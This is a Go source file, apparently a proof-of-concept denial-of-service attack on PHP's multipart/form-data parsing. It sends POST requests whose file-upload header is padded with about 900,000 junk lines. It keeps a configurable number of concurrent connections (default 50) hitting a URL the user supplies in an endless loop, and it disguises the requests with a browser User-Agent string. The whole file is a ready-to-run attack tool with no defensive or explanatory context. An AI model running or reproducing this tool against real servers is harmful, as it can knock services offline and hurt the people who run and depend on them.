// php multipart/formdata dos attack
//
// cloud@txthinking.com
package main

import(
    "github.com/txthinking/ant"
    "fmt"
    "io"
    "bytes"
    "net/http"
    "time"
    "io/ioutil"
    "flag"
)


var h bool
var u string
var n int
var c int

func Usage(){
    var usage string = `PHP DOS POC
Usage:
    -h        help
    -u        attack url
    -n        count of header line, default 900000
    -c        keep the number of connections

Creator: Cloud <cloud@txthinking.com>
`
    fmt.Print(usage)
}

func main() {
    flag.BoolVar(&h, "h", false, "Usage.")
    flag.StringVar(&u, "u", "", "")
    flag.IntVar(&n, "n", 900000, "")
    flag.IntVar(&c, "c", 50, "")
    flag.Parse()
    if h || u==""{
        Usage()
        return
    }
    ch := make(chan int, c)
    for i:=0; i<c; i++{
        ch <- i
    }

    for{
        <-ch
        go func(){
            err := Send(u)
            if err != nil{
                fmt.Println(err)
            }
            ch <- 1
        }()
    }
}

func payload(boundary string)(ior io.Reader){
    var bf *bytes.Buffer = &bytes.Buffer{}

    bf.WriteString(fmt.Sprintf("--%s\n", boundary)) // \n
    bf.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"", "fakejiaifudabuliu", "fakejiaifudabuliu.png"))
    for i:=0;i<n;i++{
        bf.WriteString(fmt.Sprintf("a\n"))
    }
    bf.WriteString(fmt.Sprintf("Content-Type: application/octet-stream\r\n\r\nfakejiaifudabuliu\r\n"))
    bf.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
    ior = bf
    return
}

func Send(url string)(err error){
    t := time.Now().Unix()
    var br io.Reader
    var bd string = ant.MakeBoundary()
    br = payload(bd)

    var tr *http.Transport = &http.Transport{
        TLSClientConfig:    nil,
        DisableCompression: true,
    }
    var client *http.Client = &http.Client{Transport: tr}
    var r *http.Request
    r, err = http.NewRequest("POST", url, br)
    fmt.Println(err)
    if err != nil{
        return
    }
    r.Header.Add("Content-Type", "multipart/form-data; boundary="+bd)
    r.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36")
    var res *http.Response
    res, err = client.Do(r)
    if err != nil{
        return
    }
    if res.StatusCode != http.StatusOK{
        fmt.Printf("HTTP Code:%d\tSpent Time:%d\n", res.StatusCode, time.Now().Unix()-t)
        return
    }
    _, _ = ioutil.ReadAll(res.Body)
    fmt.Printf("HTTP Code:%d\tSpent Time:%d\n", res.StatusCode, time.Now().Unix()-t)
    res.Body.Close()
    return
}
